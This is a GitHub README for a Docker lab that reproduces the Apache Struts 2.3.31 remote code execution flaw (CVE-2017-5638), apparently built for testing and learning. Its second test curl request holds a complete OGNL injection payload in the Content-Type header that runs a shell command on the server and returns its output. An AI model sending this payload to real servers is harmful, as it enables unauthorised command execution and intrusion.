# vulnerability_struts-2.3.31

Build the struts-2.3.31 (CVE-2017-5638) environment

| Infos    | Value                                                              |
| -------- | -------------------------------------------------------------------|
| Username | [https://github.com/testpilot031](https://github.com/testpilot031) |
| Url      | [https://github.com/testpilot031/vulnerability_struts-2.3.31](https://github.com/testpilot031/vulnerability_struts-2.3.31)                                               |
| Stars    | 0                                                          |
| License  | Apache License 2.0                                                        |

<details>

<summary>Topic / Tags</summary>



</details>

## Readme

# vulnerability_struts-2.3.31
Build the struts-2.3.31 (CVE-2017-5638) environment.
https request is possible.

## environment
Ubuntu 20.04
Docker 20.10.12
curl 7.68.0

## Server Startup
We will use the tomcat:7.0-jre8 docker image.
Unzip struts-2.3.31.zip in a directory of your choice.
cd struts-2.3.31
sudo docker build -t struts/2_3_31 .
sudo docker run -it --rm -p 8443:8443 struts/2_3_31

## Test Request
one(expect 200OK)
curl --location --request GET 'https://127.0.0.1:8443/struts2-showcase/showcase.action' -k -I

another(expect 200OK)
curl --location --request GET 'https://127.0.0.1:8443/struts2-showcase/showcase.action' --header 'Content-Type: %{(#_='\''multipart/form-data'\'').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['\''com.opensymphony.xwork2.ActionContext.container'\'']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='\''ls'\'').(#iswin=(@java.lang.System@getProperty('\''os.name'\'').toLowerCase().contains('\''win'\''))).(#cmds=(#iswin?{'\''cmd.exe'\'','\''/c'\'',#cmd}:{'\''/bin/bash'\'','\''-c'\'',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}'  -k

## Detail
struts2-showcase.war is downloaded below
https://archive.apache.org/dist/struts/2.3.31/

server.xml is tomcat setting file.
It edited for ssl enable. 



## Get the content

```
git clone https://github.com/testpilot031/vulnerability_struts-2.3.31
cd vulnerability_struts-2.3.31
```

{% embed url="https://github.com/testpilot031/vulnerability_struts-2.3.31" %}

<figure><img src="https://avatars.githubusercontent.com/u/7565250?v=4" alt=""><figcaption><p>testpilot031</p></figcaption></figure>
